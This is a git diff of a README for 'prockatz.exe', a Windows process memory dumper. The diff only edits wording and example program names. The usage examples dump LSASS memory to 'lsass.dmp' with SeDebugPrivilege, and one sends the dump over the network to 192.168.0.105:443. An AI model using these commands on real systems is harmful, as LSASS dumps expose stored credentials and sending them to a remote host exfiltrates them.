@@ -5,7 +5,7 @@
 This tool provides the functionality to create memory dumps of processes on Windows systems. It can handle privileged processes by setting `SeDebugPrivilege`, supports snapshot creation for non-invasive dumping, and can send dumps over the network.
 
 ## Features
-- **Elevate Privileges**: Gain `SeDebugPrivilege` to handle privileged processes.
+- **Enable debug Privileges**: Gain `SeDebugPrivilege` to handle privileged processes.
 - **Network Transmission**: Send process dumps to a specified IP and port.
 - **Snapshot Creation**: Create a snapshot of the process for a non-intrusive dump.
 - **Support for both PID and Process Name**: Specify the target for dumping either by PID or process name.
@@ -28,7 +28,7 @@ This tool provides the functionality to create memory dumps of processes on Wind
 ``prockatz.exe --pid 1000 --dmp lsass.dmp``
 
 ### Dumping a Process by Name
-``program_name --procname "example.exe" --dmp "lsass.dmp"``
+``prockatz.exe --procname "example.exe" --dmp "lsass.dmp"``
 
 ### Dumping a Process by PID with Elevated Privileges
 ``prockatz.exe --pid 1000 --dmp lsass.dmp --elevate``
@@ -36,7 +36,6 @@ This tool provides the functionality to create memory dumps of processes on Wind
 
 ### Sending a Dump Over the Network
 ``prockatz.exe --pid 1000 --ip 192.168.0.105 --port 443 --elevate``
-
 
 
 ### Creating a Snapshot and Dumping
